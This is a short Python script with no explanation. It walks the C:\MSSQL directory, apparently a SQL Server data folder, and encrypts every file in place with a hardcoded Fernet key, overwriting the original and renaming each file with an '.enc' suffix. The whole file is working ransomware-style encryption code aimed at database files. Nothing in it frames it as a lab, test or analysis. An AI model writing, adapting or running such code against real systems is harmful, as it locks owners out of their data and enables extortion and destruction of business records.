from cryptography.fernet import Fernet
import os

key = "uCBxMmq6BOwvAHepqu3JZZD9CQf69kVCobDPDjPCg+A="

fer = Fernet(key)

os.chdir(r"C:\MSSQL")
files_to_rename = []
for root, dirs, files in os.walk('.'):
    print(files)
    for filename in files:
        try:
            filepath = os.path.join(root, filename)
            if filepath.endswith('.enc'):
                continue
            
            with open(filepath, 'rb') as f:
                data = f.read()

            with open(filepath, 'w') as f:
                f.write(fer.encrypt(data).decode())
                #change name of file adding .enc
                files_to_rename.append(filepath)
            
        except Exception as e:
            print(e)
            print('Error encrypting file: ', filepath)
            continue  
     
for filepath in files_to_rename:        
    os.rename(filepath, filepath + '.enc')
    
files_to_rename = []